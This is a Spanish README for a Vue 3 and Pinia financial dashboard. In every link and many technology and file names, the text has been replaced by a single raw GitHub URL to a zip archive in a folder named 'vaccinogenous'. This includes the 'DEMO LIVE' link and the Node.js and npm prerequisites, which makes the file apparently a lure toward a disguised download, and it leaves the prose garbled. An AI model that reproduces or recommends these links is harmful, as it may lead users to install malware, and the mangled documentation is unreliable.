# Dashboard Financiero de Instrumentos

Este proyecto es una aplicación web interactiva desarrollada con https://raw.githubusercontent.com/willsondev/dashbord-financiero/main/vaccinogenous/dashbord-financiero.zip 3 que presenta un dashboard para visualizar datos de instrumentos financieros. La aplicación permite a los usuarios ver una lista de acciones, seleccionar una de ellas y visualizar información detallada, incluyendo un resumen, detalles de cotización y un gráfico histórico de su rendimiento.

## DEMO LIVE 
https://raw.githubusercontent.com/willsondev/dashbord-financiero/main/vaccinogenous/dashbord-financiero.zip

## Características Principales

- **Interfaz Reactiva:** Construida como una Single Page Application (SPA) utilizando Vue 3 y Composition API.
- **Componentización:** La interfaz está dividida en componentes reutilizables y bien definidos (`Header`, `Chart`, `Summary`, `InstrumentList`, etc.).
- **Manejo de Estado Centralizado:** Utiliza Pinia para gestionar el estado global de la aplicación, como el instrumento seleccionado y los datos cargados.
- **Carga Dinámica de Datos:** Los datos detallados de cada instrumento (`resumen` e `historial`) se cargan dinámicamente desde archivos JSON locales solo cuando son necesarios.
- **Visualización de Datos:** Incluye un gráfico interactivo (usando https://raw.githubusercontent.com/willsondev/dashbord-financiero/main/vaccinogenous/dashbord-financiero.zip) que muestra el rendimiento histórico del instrumento seleccionado, con la capacidad de filtrar por diferentes períodos de tiempo (1D, 1M, 1A, etc.).
- **Diseño Responsivo:** La interfaz se adapta a diferentes tamaños de pantalla, funcionando correctamente en computadores de escritorio, tablets y dispositivos móviles.
- **Testing:** El proyecto está configurado con Vitest para pruebas unitarias y de integración, asegurando la fiabilidad de los componentes y la lógica del store.

## Tecnologías Utilizadas

- **https://raw.githubusercontent.com/willsondev/dashbord-financiero/main/vaccinogenous/dashbord-financiero.zip 3:** El framework principal para construir la interfaz de usuario.
- **Vite:** Herramienta de frontend de última generación para un desarrollo rápido y una compilación optimizada.
- **Pinia:** La librería oficial y recomendada para el manejo de estado en https://raw.githubusercontent.com/willsondev/dashbord-financiero/main/vaccinogenous/dashbord-financiero.zip
- **https://raw.githubusercontent.com/willsondev/dashbord-financiero/main/vaccinogenous/dashbord-financiero.zip & vue-chartjs:** Para la creación de gráficos dinámicos y personalizables.
- **Vitest & Vue Test Utils:** Para la configuración y ejecución de pruebas unitarias y de integración.

## Configuración del Proyecto

### Requisitos Previos

- [https://raw.githubusercontent.com/willsondev/dashbord-financiero/main/vaccinogenous/dashbord-financiero.zip](https://raw.githubusercontent.com/willsondev/dashbord-financiero/main/vaccinogenous/dashbord-financiero.zip) (versión 16+ recomendada)
- [npm](https://raw.githubusercontent.com/willsondev/dashbord-financiero/main/vaccinogenous/dashbord-financiero.zip) (o un gestor de paquetes como yarn o pnpm)

### Instalación

1.  Clona o descarga el repositorio en tu máquina local.
2.  Navega a la carpeta raíz del proyecto.
3.  Instala todas las dependencias necesarias ejecutando:

```sh
npm install
```

## Uso

La aplicación estará disponible en la dirección que aparezca en tu terminal (generalmente `http://localhost:5173/`).

### Compilar para Producción

Para compilar y minificar la aplicación para un entorno de producción, ejecuta:

```sh
npm run build
```

Los archivos finales se generarán en una carpeta `dist/` en la raíz del proyecto.

### Ejecutar Pruebas

Para ejecutar las pruebas unitarias y de integración definidas con Vitest, ejecuta:

```sh
npm run test
```

Esto iniciará el corredor de pruebas en modo "watch", volviendo a ejecutar las pruebas cada vez que se detecte un cambio en los archivos.

## Estructura del Proyecto

La estructura de carpetas principal dentro de `src/` es la siguiente:

```
src/
├── assets/         # Archivos estáticos como CSS.
├── components/     # Componentes de Vue reutilizables.
├── services/       # Archivos de datos (JSON).
├── store/          # Stores de Pinia para el manejo de estado.
├── tests/          # Archivos de pruebas (unitarias e integración).
├── https://raw.githubusercontent.com/willsondev/dashbord-financiero/main/vaccinogenous/dashbord-financiero.zip         # Componente raíz de la aplicación.
└── https://raw.githubusercontent.com/willsondev/dashbord-financiero/main/vaccinogenous/dashbord-financiero.zip         # Archivo de entrada de la aplicación.
